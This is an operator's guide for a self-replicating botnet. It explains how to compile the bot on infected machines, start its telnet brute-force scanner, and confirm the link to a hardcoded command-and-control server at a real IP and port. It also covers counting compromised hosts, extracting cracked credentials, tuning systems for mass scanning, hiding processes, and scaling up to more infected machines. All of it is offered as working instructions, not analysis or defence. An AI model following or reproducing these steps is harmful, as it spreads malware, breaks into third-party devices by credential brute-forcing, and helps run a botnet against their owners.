# Self-Replication Verification Guide

This guide provides comprehensive steps to ensure self-replication is working correctly on infected machines.

## 🎯 **Quick Verification Steps**

### **1. Run the Verification Script**
```bash
cd /root/bot
./verify_selfrep.sh
```

This script checks:
- ✅ Debug binary compilation and flags
- ✅ Process status and scanner initialization  
- ✅ Debug logging functionality
- ✅ CNC server connectivity
- ✅ System resources and limits

### **2. Start Self-Replication with Monitoring**
```bash
# Start the bot with debug logging
./start_selfrep_debug.sh

# In another terminal, monitor activity
./monitor_selfrep.sh monitor
```

## 🔍 **Detailed Verification Process**

### **Step 1: Verify Compilation**
```bash
cd /root/bot

# Check if debug version exists
ls -la selfrep_debug

# Verify compilation flags
strings selfrep_debug | grep -E "(SELFREP|DEBUG)"

# Recompile if needed
make -f Makefile_debug clean
make -f Makefile_debug
```

**Expected Output:**
- Binary should exist and be executable
- Should contain both `SELFREP` and `DEBUG` strings

### **Step 2: Test Self-Replication Startup**
```bash
# Start the bot
./selfrep_debug test_selfrep &

# Check processes
ps aux | grep -E "(selfrep|scanner)"

# Check debug log
tail -f /tmp/selfrep_debug.log
```

**Expected Log Entries:**
```
[2024-01-15 10:30:15] [SELFREP] Bot started with PID: 12345
[2024-01-15 10:30:15] [SELFREP] Initializing self-replication scanner
[2024-01-15 10:30:15] [SCANNER] Scanner process started with PID: 12346
[2024-01-15 10:30:15] [SELFREP] Scanner initialized successfully
```

### **Step 3: Verify Scanner Activity**
```bash
# Monitor scanner processes
ps aux | grep scanner

# Check for target discovery
grep "Attempting to brute force" /tmp/selfrep_debug.log

# Check for successful compromises
grep "successful compromise" /tmp/selfrep_debug.log
```

**Expected Behavior:**
- Scanner process should be running
- Should see brute force attempts on discovered targets
- May see successful compromises with credentials

### **Step 4: Verify CNC Connection**
```bash
# Check CNC connectivity
ping -c 1 185.247.117.214

# Check if bot connects to CNC
grep "connected to CNC" /tmp/selfrep_debug.log
grep "Using hardcoded CNC IP" /tmp/selfrep_debug.log
```

**Expected Log Entries:**
```
[2024-01-15 10:30:15] [SELFREP] Using hardcoded CNC IP for self-rep: 185.247.117.214:59666
[2024-01-15 10:30:16] [SELFREP] Successfully connected to CNC server
```

## 📊 **Monitoring and Analysis**

### **Real-time Monitoring**
```bash
# Start comprehensive monitoring
./monitor_selfrep.sh monitor

# Check status
./monitor_selfrep.sh status

# View recent activity
./monitor_selfrep.sh recent

# Show successful compromises
./monitor_selfrep.sh compromises

# Show target statistics
./monitor_selfrep.sh targets
```

### **Log Analysis Commands**
```bash
# Count successful compromises
grep "successful compromise" /tmp/selfrep_debug.log | wc -l

# Find most common credentials
grep "with auth" /tmp/selfrep_debug.log | awk '{print $NF}' | sort | uniq -c

# Check connection attempts
grep "Attempting to brute force" /tmp/selfrep_debug.log | wc -l

# Extract targeted IPs
grep "Attempting to brute force IP" /tmp/selfrep_debug.log | \
  sed 's/.*IP \([0-9.]*\):.*/\1/' | sort | uniq

# Timeline analysis
grep "\[20" /tmp/selfrep_debug.log | head -10
```

## 🚨 **Troubleshooting Common Issues**

### **Issue 1: Bot Not Starting**
**Symptoms:**
- No processes running
- No log file created

**Solutions:**
```bash
# Check compilation
make -f Makefile_debug clean && make -f Makefile_debug

# Check permissions
ls -la /tmp/selfrep_debug.log
chmod 666 /tmp/selfrep_debug.log

# Check system limits
ulimit -n 999999
```

### **Issue 2: Scanner Not Working**
**Symptoms:**
- Bot starts but no scanner process
- No brute force attempts in logs

**Solutions:**
```bash
# Check if SELFREP flag is enabled
strings selfrep_debug | grep SELFREP

# Recompile with correct flags
make -f Makefile_debug clean
make -f Makefile_debug

# Check system resources
free -m
ulimit -n
```

### **Issue 3: No Successful Compromises**
**Symptoms:**
- Scanner running but no successful compromises
- Only connection attempts, no successful auth

**Solutions:**
```bash
# Check if targets are reachable
grep "Attempting to brute force IP" /tmp/selfrep_debug.log | \
  sed 's/.*IP \([0-9.]*\):.*/\1/' | head -5 | xargs -I {} ping -c 1 {}

# Check credential database
grep -c "add_auth_entry" scanner.c

# Monitor for longer period
./start_selfrep_debug.sh
# Let it run for 10-15 minutes
```

### **Issue 4: CNC Connection Failed**
**Symptoms:**
- Bot starts but can't connect to CNC
- No "Successfully connected to CNC server" in logs

**Solutions:**
```bash
# Check CNC server connectivity
ping -c 1 185.247.117.214
telnet 185.247.117.214 59666

# Check firewall/network
iptables -L
netstat -tuln | grep 59666

# Check if CNC server is running
# (This requires access to the CNC server)
```

## 📈 **Performance Optimization**

### **System Tuning**
```bash
# Increase file descriptor limit
ulimit -n 999999

# Enable TCP reuse
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse

# Optimize network settings
echo 'net.core.rmem_max = 16777216' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 16777216' >> /etc/sysctl.conf
sysctl -p
```

### **Scanner Configuration**
```bash
# Adjust scanner settings in scanner.h
# SCANNER_MAX_CONNS: Number of concurrent connections
# SCANNER_RAW_PPS: Packets per second rate

# Current settings:
# SCANNER_MAX_CONNS = 256
# SCANNER_RAW_PPS = 384
```

## 🔒 **Security Considerations**

### **Log File Security**
```bash
# Secure the debug log file
chmod 600 /tmp/selfrep_debug.log

# Consider encrypting sensitive logs
gpg -c /tmp/selfrep_debug.log

# Regular log rotation
./rotate_logs.sh
```

### **Process Hiding**
```bash
# Check if processes are visible
ps aux | grep selfrep

# Consider using process hiding techniques
# (Advanced - requires kernel modifications)
```

## 📋 **Verification Checklist**

- [ ] Debug binary compiled with SELFREP and DEBUG flags
- [ ] Bot process starts successfully
- [ ] Scanner process initializes
- [ ] Debug logging writes to file
- [ ] CNC server is reachable
- [ ] Bot connects to CNC server
- [ ] Scanner discovers targets
- [ ] Brute force attempts are logged
- [ ] Successful compromises are reported
- [ ] System resources are adequate

## 🎯 **Success Indicators**

**Self-replication is working correctly when you see:**

1. **Bot Startup:**
   ```
   [SELFREP] Bot started with PID: XXXX
   [SELFREP] Initializing self-replication scanner
   [SCANNER] Scanner process started with PID: XXXX
   ```

2. **CNC Connection:**
   ```
   [SELFREP] Using hardcoded CNC IP for self-rep: 185.247.117.214:59666
   [SELFREP] Successfully connected to CNC server
   ```

3. **Target Discovery:**
   ```
   [SCANNER] Attempting to brute force IP X.X.X.X:23
   ```

4. **Successful Compromises:**
   ```
   [SCANNER] Reporting successful compromise: X.X.X.X:23 with auth username:password
   ```

## 🚀 **Next Steps**

Once self-replication is verified to be working:

1. **Monitor Performance:** Use `./monitor_selfrep.sh monitor` for real-time monitoring
2. **Analyze Results:** Review successful compromises and target statistics
3. **Optimize Settings:** Adjust scanner parameters based on performance
4. **Scale Up:** Deploy to multiple infected machines
5. **Maintain Logs:** Implement log rotation and cleanup

## 📞 **Support Commands**

```bash
# Quick status check
./verify_selfrep.sh

# Real-time monitoring
./monitor_selfrep.sh monitor

# View all successful compromises
./monitor_selfrep.sh compromises

# Check system status
./monitor_selfrep.sh status
```

This comprehensive guide ensures that self-replication is working correctly and provides tools for ongoing monitoring and troubleshooting.
